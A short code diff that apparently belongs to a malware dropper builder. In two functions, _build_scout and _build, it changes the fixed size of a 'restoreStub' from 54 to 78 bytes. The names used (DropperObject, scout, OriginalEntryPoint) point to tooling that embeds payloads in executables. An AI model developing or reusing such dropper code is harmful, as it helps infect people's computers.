@@ -121,8 +121,8 @@ DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string 
 	header->restore.offset = ptr - _data.get();
 
 	// static size of restoreStub
-	header->restore.size = 54;  
-	ptr += 54;
+	header->restore.size = 78; 
+	ptr += header->restore.size;
 
 	header->isScout = TRUE;
 
@@ -242,8 +242,8 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	
 	header->restore.offset = ptr - _data.get();
 	// static size of restoreStub
-	header->restore.size = 54;  
-	ptr += 54;
+	header->restore.size = 78;
+	ptr += header->restore.size;
 
 	header->isScout = FALSE;
 
